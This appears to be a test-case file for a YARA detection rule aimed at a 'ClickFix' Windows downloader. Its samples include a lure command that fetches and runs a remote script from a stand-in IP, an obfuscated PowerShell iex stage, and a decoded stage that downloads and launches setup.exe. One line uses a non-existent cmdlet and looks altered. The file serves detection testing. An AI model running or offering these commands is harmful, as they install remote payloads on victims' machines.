# Cases for Win.Downloader.ClickFixTopaz.yar: each `text` must match exactly
# the rules in `rules` (none: it must match nothing).

[[case]]
name = "the lure command pasted into Run"
text = "start https://topazlabs.com;start powershell -wi hi '.(''''.Trim.Name[2]+''ex'')(irm 203.0.113.5/File_exe_1.txt)'"
rules = ["Win_Downloader_ClickFix_Lure_Command"]

[[case]]
name = "the obfuscated PowerShell stage"
text = "sv('on'+'ci')(gcm ???t?).Name;Set-Variable('FL'+'io')'FromBxyzase64String'.Remove(5,3);for($i = 0; $i -lt 3; $i++) {((gv('IQq'+'f') -Va))[$i]=(gv('vly'+'i') -V)[$i] -bxor (gv('AF'+'Ei') -V)[$i % 5]};.'itviaex'.Remove(1,4)(-join ((gv('IQq'+'f') -Value)| % {[char]$_ }))"
rules = ["Win_Downloader_ClickFix_PowerShell_Stage"]

[[case]]
name = "the decoded stage"
text = "$a=Join-Path $env:AppData 'setup.exe';Copy-Items -useba https://203.0.113.5/setup.exe -o $a;start $a ;"
rules = ["Win_Downloader_ClickFix_Decoded_Stage"]

[[case]]
name = "ordinary PowerShell that downloads a tool"
text = "$p = Join-Path $env:AppData 'tool'; Invoke-WebRequest -UseBasicParsing https://example.com/tool.zip -OutFile $p; Write-Output 'done'"
rules = []
